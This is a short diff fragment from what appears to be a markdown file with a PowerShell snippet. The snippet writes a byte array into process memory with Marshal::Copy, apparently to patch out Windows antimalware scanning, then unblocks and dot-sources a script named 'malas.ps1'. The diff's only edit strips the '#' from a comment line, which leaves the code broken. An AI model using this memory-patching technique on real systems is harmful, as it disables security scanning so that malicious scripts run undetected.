@@ -144,7 +144,7 @@ $stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 
 $marshalClass = [System.Runtime.InteropServices.Marshal]
 $marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
 
-#Run your powershell here
+Run your powershell here
 Unblock-File -Path .\malas.ps1
 . .\malas.ps1
 ```
